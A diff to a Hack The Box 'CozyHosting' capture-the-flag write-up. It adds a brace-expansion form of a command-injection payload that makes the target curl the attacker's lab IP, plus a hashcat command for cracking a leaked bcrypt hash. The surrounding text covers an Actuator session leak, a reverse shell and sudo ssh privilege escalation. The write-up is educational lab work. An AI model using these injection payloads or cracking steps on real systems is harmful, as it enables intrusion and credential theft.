@@ -5,6 +5,7 @@ subtitle: "Spring Boot Actuator session leak, command injection in /executessh, 
 date: 2023-09-03
 tags: [htb, linux, command-injection, info-disclosure, privesc]
 category: writeups
+kind: machine
 tldr: "An exposed Spring Boot Actuator handed me a live admin JSESSIONID. The admin panel's /executessh endpoint injected the username into a shell command, giving a shell as app. Postgres creds from the JAR let me dump and crack an admin bcrypt hash, which logged in josh over SSH. sudo /usr/bin/ssh with a ProxyCommand gave root."
 ---
 
@@ -14,7 +15,7 @@ CozyHosting is a Linux box running nginx 1.18.0 on port 80 and SSH on 22. Port 8
 
 ## recon
 
-nmap showed 22 and 80. Content discovery turned up the login routes and, more usefully, exposed Actuator endpoints:
+nmap showed 22 (OpenSSH 8.9p1, Ubuntu 22.04) and 80. Content discovery turned up the login routes and, more usefully, exposed Actuator endpoints:
 
 ```
 [200] /actuator
@@ -49,6 +50,8 @@ The validator only rejected whitespace in `username`, so I used `${IFS}` instead
 host=127.0.0.1&username=;curl${IFS}http://10.10.14.105:8000/;
 ```
 
+Brace expansion is an equivalent space-free form: `username=;{curl,http://10.10.14.105:8000/};#`.
+
 Swapping the curl for a reverse shell payload landed a shell as `app`.
 
 ## user
@@ -72,10 +75,10 @@ SELECT * FROM users;
  admin | $2a$10$SpKYdHLB0FOaT7n3x72wtuS0yR8uqqbNNpIPjUb2MZib3H9kVO8dm | Admin
 ```
 
-john cracked the admin hash to `manchesterunited`. That password worked for the SSH user `josh`:
+john cracked the admin hash (bcrypt, `$2a$`) to `manchesterunited`. Hashcat mode 3200 does the same. That password worked for the SSH user `josh`:
 
 ```
-john --wordlist=rockyou.txt hash   # -> manchesterunited
+hashcat -m 3200 hash rockyou.txt   # -> manchesterunited
 ssh josh@cozyhosting.htb
 ```
 
@@ -101,3 +104,8 @@ That dropped a root shell and the root flag.
 ## takeaway
 
 Actuator endpoints should never be public. The session leak was the whole chain's start, the command injection only needed `${IFS}` to dodge the whitespace filter, and `sudo ssh` is trivially abused via ProxyCommand.
+
+## references
+
+- [0xdf, HTB: CozyHosting](https://0xdf.gitlab.io/2024/03/02/htb-cozyhosting.html)
+- [CozyHosting - HackTheBox](https://www.hackthebox.com/machines/cozyhosting)
